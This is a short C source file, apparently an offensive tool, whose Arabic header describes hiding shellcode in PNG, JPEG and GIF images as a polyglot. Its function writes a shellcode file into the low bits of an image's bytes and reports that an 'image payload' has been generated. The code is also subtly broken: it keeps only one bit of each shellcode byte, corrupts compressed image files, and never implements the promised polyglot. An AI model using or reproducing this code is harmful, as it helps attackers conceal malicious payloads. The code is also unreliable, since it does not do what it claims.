/*
 * stegosaurus_rex.c - إخفاء shellcode في الصور (PNG/JPEG/GIF) + polyglot
 */
#include <stdio.h>
#include <stdlib.h>

void generate_image_payload(const char *image, const char *shellcode, const char *output) {
    FILE *in = fopen(image, "rb");
    FILE *pay = fopen(shellcode, "rb");
    FILE *out = fopen(output, "wb");
    unsigned char pixel, bit;
    while (fread(&pixel, 1, 1, in) == 1) {
        if (fread(&bit, 1, 1, pay) == 1) {
            pixel = (pixel & 0xFE) | (bit & 0x01); // LSB
        }
        fwrite(&pixel, 1, 1, out);
    }
    fclose(in); fclose(pay); fclose(out);
    printf("[*] Image payload generated: %s\n", output);
}
